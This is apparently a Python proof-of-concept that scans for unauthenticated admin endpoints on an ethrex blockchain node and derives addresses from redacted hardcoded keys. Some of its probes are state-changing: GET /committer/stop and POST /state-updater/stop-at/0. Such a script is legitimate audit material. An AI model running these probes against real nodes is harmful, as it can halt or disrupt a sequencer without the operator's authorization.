#!/usr/bin/env python3
"""
Blockchain Node Audit — Hardcoded Key Scanner & Admin Endpoint Probe

Usage:
  python3 node-audit-poc.py <target_base_url>

Default target: http://127.0.0.1:5555 (ethrex admin server default)

This script:
  1. Derives public addresses from known hardcoded private keys
  2. Probes common admin server endpoints for unauthenticated access
  3. Reports which endpoints are reachable and their responses

For educational/authorized audit use only.
"""

import sys
import requests
from eth_account import Account

# Known hardcoded keys from blockchain node clients
# Add new findings here as they are discovered
HARDCODED_KEYS = {
    # Plasma ethrex L2 sequencer (cmd/ethrex/l2/options.rs)
    "plasma_ethrex_sponsor": "<REDACTED-PRIVATE-KEY:SPONSOR>",
    "plasma_ethrex_committer": "<REDACTED-PRIVATE-KEY:COMMITTER>",
    "plasma_ethrex_proof_coord": "<REDACTED-PRIVATE-KEY:PROOF-COORD>",
}

# Common admin endpoint paths across node implementations
ADMIN_ENDPOINTS = [
    ("GET", "/health"),
    ("GET", "/admin/health"),
    ("GET", "/committer/stop"),
    ("GET", "/committer/start"),
    ("GET", "/committer/start/0"),
    ("POST", "/state-updater/stop-at/0"),
    ("GET", "/status"),
    ("GET", "/metrics"),
    ("GET", "/debug/health"),
    ("GET", "/api/health"),
    ("GET", "/v1/health"),
]


def derive_addresses():
    """Derive and display addresses for all hardcoded keys."""
    print("=" * 60)
    print("HARDCODED KEY ADDRESSES")
    print("=" * 60)
    for name, pk in HARDCODED_KEYS.items():
        try:
            acct = Account.from_key(pk)
            print(f"  {name:30s}: {acct.address}")
        except Exception as e:
            print(f"  {name:30s}: ERROR — {e}")
    print()


def probe_endpoints(base_url: str) -> list:
    """Probe admin endpoints and return results."""
    results = []
    print(f"Probing {base_url}...")
    print("-" * 60)

    for method, path in ADMIN_ENDPOINTS:
        url = f"{base_url.rstrip('/')}{path}"
        try:
            if method == "GET":
                resp = requests.get(url, timeout=3)
            else:
                resp = requests.post(url, timeout=3)

            status = resp.status_code
            body = resp.text[:150] if resp.text else "(empty)"
            reachable = status != 404

            results.append({
                "method": method,
                "path": path,
                "status": status,
                "body": body,
                "reachable": reachable,
            })

            indicator = "✓" if reachable else "✗"
            print(f"  {indicator} {method:4s} {path:40s} → {status} {body[:80]}")

        except requests.exceptions.ConnectionError:
            results.append({"method": method, "path": path, "status": 0, "body": "Connection refused", "reachable": False})
            print(f"  ✗ {method:4s} {path:40s} → UNREACHABLE")
        except requests.exceptions.Timeout:
            results.append({"method": method, "path": path, "status": 0, "body": "Timeout", "reachable": False})
            print(f"  ✗ {method:4s} {path:40s} → TIMEOUT")
        except Exception as e:
            results.append({"method": method, "path": path, "status": -1, "body": str(e), "reachable": False})
            print(f"  ? {method:4s} {path:40s} → ERROR: {e}")

    return results


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5555"

    derive_addresses()
    results = probe_endpoints(target)

    reachable = [r for r in results if r["reachable"]]
    print()
    print("=" * 60)
    if reachable:
        print(f"RESULT: {len(reachable)} unauthenticated endpoint(s) found!")
        print("These endpoints may allow operational control without authentication.")
        for r in reachable:
            print(f"  {r['method']} {r['path']} (HTTP {r['status']})")
    else:
        print("No unauthenticated admin endpoints found at this address.")
        print("The vulnerability may still exist in deployments that:")
        print("  - Bind admin server to 0.0.0.0 instead of 127.0.0.1")
        print("  - Use a different port than the default")
        print("  - Run inside Docker with exposed ports")
    print("=" * 60)


if __name__ == "__main__":
    try:
        import requests
        import eth_account
    except ImportError:
        print("Missing dependency. Install with: pip install requests eth-account")
        sys.exit(1)

    main()
